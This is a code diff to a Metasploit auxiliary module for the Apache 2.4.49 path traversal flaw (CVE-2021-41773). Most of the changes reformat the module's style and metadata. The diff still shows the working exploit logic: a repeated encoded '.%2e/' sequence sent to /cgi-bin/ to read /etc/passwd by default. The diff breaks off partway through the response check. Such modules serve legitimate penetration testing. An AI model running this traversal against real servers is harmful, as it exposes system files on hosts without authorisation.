@@ -9,42 +9,48 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'Path Traversal in Apache 2.4.49',
-      'Description' => %q{
-        This module exploits an unauthenticated directory traversal vulnerability which exists in Apache version 2.4.49.
-        If files outside of the document root are not protected by ‘require all denied’ these requests can succeed.
-      },
-      'References'  =>
-        [
-          ['CVE', '2021-41773'],
-          ['URL', 'https://httpd.apache.org/security/vulnerabilities_24.html'],
-          ['URL', 'https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse']
-        ],
-      'Author'      =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Path Traversal in Apache 2.4.49',
+        'Description' => %q{
+          This module exploits an unauthenticated directory traversal vulnerability which exists in Apache version 2.4.49.
+          If files outside of the document root are not protected by ‘require all denied’ these requests can succeed.
+        },
+        'Author' => [
           'Ash Daulton', # Vulnerability discovery
-          'Dhiraj Mishra' # Metasploit module
+          'Dhiraj Mishra', # Metasploit Module
         ],
-      'DisclosureDate' => '2021-05-10',
-      'License'     => MSF_LICENSE
-    ))
+        'License' => MSF_LICENSE,
+        'References' => [
+          ['CVE', '2021-41773']
+        ],
+        'DisclosureDate' => '2021-10-05',
+        'Platform' => 'ruby',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [REPEATABLE_SESSION],
+          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(443),
-        OptString.new('FILEPATH', [true, "The path to the file to read", '/etc/passwd']),
+        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
         OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 5 ])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
     filename = datastore['FILEPATH']
-    traversal = ".%2e/" * datastore['DEPTH'] << filename
+    traversal = '.%2e/' * datastore['DEPTH'] << filename
 
     res = send_request_raw({
       'method' => 'GET',
-      'uri'    => "/cgi-bin/#{traversal}"
+      'uri' => "/cgi-bin/#{traversal}"
     })
 
     unless res && res.code == 200
